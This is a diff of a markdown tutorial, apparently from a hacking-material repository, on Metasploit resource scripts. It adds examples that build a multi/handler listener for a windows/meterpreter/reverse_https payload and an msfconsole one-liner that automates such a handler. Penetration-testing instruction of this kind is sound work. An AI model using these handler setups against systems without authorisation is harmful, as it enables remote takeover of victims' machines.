@@ -29,18 +29,41 @@
 <br /><br /><br />
 
 ## RESOURCE FILES EXAMPLES
+
+- **Runing resource scripts**
+
+      msfconsole -r my_resource_file.rc
+      msfconsole -r /root/my_resource_file.rc
+      msf > resource /root/my_resource_file.rc
+      meterpreter > resource /root/my_resource_file.rc
+
+<br />
+
 <blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. personally recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands in a file, which can be used with the resource command.</blockquote>
 
-- **Runing resource files**
+- **Create a resource file to display the version number of metasploit (manually)**
 
-      msfconsole -r version.rc
-      msfconsole -r /root/version.rc
-      meterpreter > resource /root/version.rc
+      touch my_resource_file.rc
+      echo 'version' > my_resource_file.rc
 
-- **Create a resource file to display the version number of metasploit (manually).**
+- **Create a resource file to display the version number of metasploit (makerc)**
 
-      touch version.rc
-      echo 'version' >> version.rc
+      kali > msfconsole
+      msf > version
+      msf > makerc /root/my_resource_file.rc
+
+<br />
+
+<blockquote>In the next example we are going to write one handler resource file</blockquote>
+
+- **Create a resource file using bash terminal prompt (bash)**
+
+      touch my_resource_file.rc
+         echo 'use exploit/multi/handler' > my_resource_file.rc
+         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> my_resource_file.rc
+         echo 'set LHOST 192.168.1.71' >> my_resource_file.rc
+         echo 'set LPORT 666' >> my_resource_file.rc
+         echo 'exploit' >> my_resource_file.rc
 
 - **Create a resource file using the core command 'makerc'**<br />
 'maekerc will build a resource file with the settings enter in msfconsole'
@@ -50,6 +73,7 @@
       msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
       msf exploit(multi/handler) > set LHOST 192.168.1.71
       msf exploit(multi/handler) > set LPORT 666
+      msf exploit(multi/handler) > exploit
 
       msf exploit(multi/handler) > makerc my_handler.rc
 
@@ -67,7 +91,7 @@
 
       sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_command -rc $IPATH/aux/$P0; exploit'
 
-
+#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
 
 ---
 
